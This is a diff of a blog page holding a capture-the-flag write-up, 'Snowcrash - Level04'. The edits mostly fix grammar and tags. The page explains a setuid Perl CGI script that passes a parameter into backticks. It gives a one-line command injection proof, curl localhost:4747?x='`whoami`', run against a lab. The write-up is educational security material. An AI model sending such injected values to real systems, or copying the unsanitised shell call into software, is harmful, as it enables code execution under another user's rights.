@@ -6,10 +6,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="florian ">
 <meta name="description" content="We have a file level04.pl with the setuid set
-#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &amp;#34;Content-type: text/html\n\n&amp;#34;; sub x { $y = $_[0]; print `echo $y 2&amp;gt;&amp;amp;1`; } x(param(&amp;#34;x&amp;#34;)); Quick explanation The script take a parameter x, include it in the string `echo $y 2&amp;gt;&amp;amp;1` ( where y is our x value )
-Then execute that string has an shell command then print its output.
+#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &amp;#34;Content-type: text/html\n\n&amp;#34;; sub x { $y = $_[0]; print `echo $y 2&amp;gt;&amp;amp;1`; } x(param(&amp;#34;x&amp;#34;)); Quick explanation The script take a parameter x.
+That parameter is included in the string `echo $y 2&amp;gt;&amp;amp;1` (where y is our x value).
+Then execute that string has a shell command then print its output.
 Normally the script should print what we give it to params x." />
-<meta name="keywords" content=", exploit" />
+<meta name="keywords" content=", Exploit, Perl, Networking" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="/posts/snowcrash/level04/" />
@@ -37,39 +38,42 @@ Normally the script should print what we give it to params x." />
 
 <meta itemprop="name" content="Snowcrash - Level04">
 <meta itemprop="description" content="We have a file level04.pl with the setuid set
-#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &#34;Content-type: text/html\n\n&#34;; sub x { $y = $_[0]; print `echo $y 2&gt;&amp;1`; } x(param(&#34;x&#34;)); Quick explanation The script take a parameter x, include it in the string `echo $y 2&gt;&amp;1` ( where y is our x value )
-Then execute that string has an shell command then print its output.
+#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &#34;Content-type: text/html\n\n&#34;; sub x { $y = $_[0]; print `echo $y 2&gt;&amp;1`; } x(param(&#34;x&#34;)); Quick explanation The script take a parameter x.
+That parameter is included in the string `echo $y 2&gt;&amp;1` (where y is our x value).
+Then execute that string has a shell command then print its output.
 Normally the script should print what we give it to params x.">
 <meta itemprop="datePublished" content="2020-08-02T21:25:56+02:00" />
 <meta itemprop="dateModified" content="2020-08-02T21:25:56+02:00" />
-<meta itemprop="wordCount" content="126">
+<meta itemprop="wordCount" content="127">
 <meta itemprop="image" content=""/>
 
 
 
-<meta itemprop="keywords" content="exploit," />
+<meta itemprop="keywords" content="Exploit,Perl,Networking," />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content=""/>
 
 <meta name="twitter:title" content="Snowcrash - Level04"/>
 <meta name="twitter:description" content="We have a file level04.pl with the setuid set
-#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &#34;Content-type: text/html\n\n&#34;; sub x { $y = $_[0]; print `echo $y 2&gt;&amp;1`; } x(param(&#34;x&#34;)); Quick explanation The script take a parameter x, include it in the string `echo $y 2&gt;&amp;1` ( where y is our x value )
-Then execute that string has an shell command then print its output.
+#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &#34;Content-type: text/html\n\n&#34;; sub x { $y = $_[0]; print `echo $y 2&gt;&amp;1`; } x(param(&#34;x&#34;)); Quick explanation The script take a parameter x.
+That parameter is included in the string `echo $y 2&gt;&amp;1` (where y is our x value).
+Then execute that string has a shell command then print its output.
 Normally the script should print what we give it to params x."/>
 
 
 
     <meta property="og:title" content="Snowcrash - Level04" />
 <meta property="og:description" content="We have a file level04.pl with the setuid set
-#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &#34;Content-type: text/html\n\n&#34;; sub x { $y = $_[0]; print `echo $y 2&gt;&amp;1`; } x(param(&#34;x&#34;)); Quick explanation The script take a parameter x, include it in the string `echo $y 2&gt;&amp;1` ( where y is our x value )
-Then execute that string has an shell command then print its output.
+#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &#34;Content-type: text/html\n\n&#34;; sub x { $y = $_[0]; print `echo $y 2&gt;&amp;1`; } x(param(&#34;x&#34;)); Quick explanation The script take a parameter x.
+That parameter is included in the string `echo $y 2&gt;&amp;1` (where y is our x value).
+Then execute that string has a shell command then print its output.
 Normally the script should print what we give it to params x." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/snowcrash/level04/" />
 <meta property="og:image" content=""/>
 <meta property="article:published_time" content="2020-08-02T21:25:56+02:00" />
-<meta property="article:modified_time" content="2020-08-02T21:25:56+02:00" /><meta property="og:site_name" content="My blog" /><meta property="og:see_also" content="/posts/snowcrash/level14/" /><meta property="og:see_also" content="/posts/snowcrash/level13/" /><meta property="og:see_also" content="/posts/snowcrash/level12/" /><meta property="og:see_also" content="/posts/snowcrash/level11/" /><meta property="og:see_also" content="/posts/snowcrash/level10/" /><meta property="og:see_also" content="/posts/snowcrash/level09/" />
+<meta property="article:modified_time" content="2020-08-02T21:25:56+02:00" /><meta property="og:site_name" content="My blog" />
 
 
 
@@ -170,15 +174,16 @@ Normally the script should print what we give it to params x." />
 }
 x(param(<span style="color:#e6db74">&#34;x&#34;</span>));
 </code></pre></div><h2 id="quick-explanation">Quick explanation</h2>
-<p>The script take a parameter <strong>x</strong>, include it in the string <code>`echo $y 2&gt;&amp;1`</code> ( where <code>y</code> is our <code>x</code> value )<br>
-Then execute that string has an shell command then print its output.</p>
+<p>The script take a parameter <strong>x</strong>.</p>
+<p>That parameter is included in the string <code>`echo $y 2&gt;&amp;1`</code> (where <code>y</code> is our <code>x</code> value).<br>
+Then execute that string has a shell command then print its output.</p>
 <p>Normally the script should print what we give it to params <strong>x</strong>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl localhost:4747?x<span style="color:#f92672">=</span>hello_world
 hello_world
 </code></pre></div><h2 id="the-weak-part">The Weak part</h2>
-<p>But because <strong>x</strong> is not sanitize and because <strong>x</strong> will be used in a shell command as it.<br>
-We can make the script execute arbitrary code with the right of <strong>flag04</strong></p>
-<h2 id="the-poc">The Poc</h2>
+<p>But because <strong>x</strong> is not sanitized and because <strong>x</strong> will be used in a shell command as it.<br>
+We can make the script execute arbitrary code with the as the user <strong>flag04</strong></p>
+<h2 id="the-poc">The POC</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl localhost:4747?x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;`whoami`&#39;</span>
 flag04
 </code></pre></div><h2 id="source">Source</h2>
@@ -196,7 +201,7 @@ flag04
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
             <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
             <line x1="7" y1="7" x2="7" y2="7"></line>
-          </svg><span class="tag"><a href="tags/exploit/">exploit</a></span>
+          </svg><span class="tag"><a href="tags/exploit/">Exploit</a></span><span class="tag"><a href="tags/perl/">Perl</a></span><span class="tag"><a href="tags/networking/">Networking</a></span>
         </p>
 
       <p>
@@ -207,7 +212,7 @@ flag04
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        126 Words
+        127 Words
       </p>
 
       <p>
